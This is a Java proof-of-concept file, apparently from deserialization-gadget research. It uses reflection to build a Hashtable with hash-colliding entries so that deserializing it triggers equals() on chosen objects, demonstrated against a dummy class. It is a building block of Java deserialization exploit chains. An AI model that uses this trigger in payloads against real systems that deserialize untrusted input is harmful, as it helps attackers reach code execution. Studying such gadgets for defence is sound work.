package com.xiinnn.readobject2equals;

import com.xiinnn.template.EqualsClass;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

// Hashtable#readObject -> equals
// 实测：jdk8u192
public class HashtableReadObject2Equals {
    public static void main(String[] args) throws Exception{
        EqualsClass e1 = new EqualsClass();
        EqualsClass e2 = new EqualsClass();
        Hashtable hashtable = makeHashtable(e1, e2);
        //成功调用 EqualsClass#equals
        byte[] poc = serialize(hashtable);
        unserialize(poc);
    }
    public static Hashtable makeHashtable(Object v1, Object v2) throws Exception {
        Hashtable hashtable = new Hashtable<>();
        setFieldValue(hashtable, "count", 2);

        Class<?> c = Class.forName("java.util.Hashtable$Entry");
        Constructor<?> constructor = c.getDeclaredConstructor(int.class, Object.class, Object.class, c);
        constructor.setAccessible(true);

        Object tbl = Array.newInstance(c, 2);
        Array.set(tbl, 0, constructor.newInstance(0, v1, 1, null));
        Array.set(tbl, 1, constructor.newInstance(0, v2, 2, null));
        setFieldValue(hashtable, "table", tbl);

        return hashtable;
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
